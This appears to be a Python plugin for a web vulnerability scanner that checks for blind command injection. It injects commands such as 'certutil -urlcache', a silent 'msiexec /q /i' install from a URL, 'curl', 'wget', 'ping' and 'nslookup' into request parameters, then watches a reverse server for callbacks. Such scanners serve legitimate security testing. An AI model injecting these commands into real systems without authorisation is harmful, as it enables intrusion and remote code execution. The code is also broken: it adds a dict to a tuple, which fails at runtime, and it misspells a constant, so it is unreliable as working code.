#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# JiuZero 2025/8/19

import re
from urllib.parse import quote
from lib.core.settings import acceptedExt
from lib.api.reverse_api import reverseApi
from api import generateResponse, random_num, conf, PLACE, VulType, POST_HINT, Type, PluginBase, Threads, KB

class Z0SCAN(PluginBase):
    name = "cmdi-blind"
    desc = 'Command Execution'
    version = "2025.8.19"
    risk = 3
    require_reverse = True
    
    def audit(self):
        url = self.requests.url
        self.rA = reverseApi()
        if conf.level == 0 or not self.risk in conf.risk:
            return
        if not self.fingerprints.waf and self.requests.suffix in acceptedExt:
            _payloads = {
                "http": [
                    "certutil -urlcache -split -f {}", 
                    "msiexec /q /i {}", 
                    "curl {}", 
                    "wget {}"
                ], 
                "dns": [
                    "ping -nc 1 {}", 
                    "nslookup {}"
                ], 
            }
            payloads = ()
            for type, cmds in _payloads.items():
                if type in KB.reverse_running_server:
                    token, fullname = self.rA.generate(type)
                    for _cmd in cmds:
                        payloads += ({"cmd": _cmd.format(fullname), "token": token})
            iterdatas = self.generateItemdatas()
            z0thread = Threads(name="cmdi-blind")
            z0thread.submit(self.process, iterdatas, payloads)
                
    def process(self, _, payloads):
        k, v, position = _
        if position in [PLACE.JSON_DATA, PLACE.MULTIPART_DATA, PLACE.XML_DATA]:
            return
        for payload in payloads:
            _payload = self.insertPayload({
                "key": k, 
                "payload": payload["cmd"], 
                "position": position, 
                })
            r = self.req(position, _payload)
            if not r:
                continue
            if self.rA.check(payload["token"]):
                result = self.generate_result()
                result.main({
                    "type": Type.REQUEST, 
                    "url": r.url, 
                    "vultype": VulType.CMD_INNJECTION, 
                    "show": {
                        "Position": f"{position} >> {k}", 
                        "Payload": payload["cmd"],
                        "Msg": "Receive from Dnslog",
                        }
                    })
                result.step("Request1", {
                    "position": position,
                    "request": r.reqinfo, 
                    "response": generateResponse(r), 
                    "desc": "Payload: {} Receive from Dnslog".format(payload["cmd"]),
                    })
                self.success(result)
                break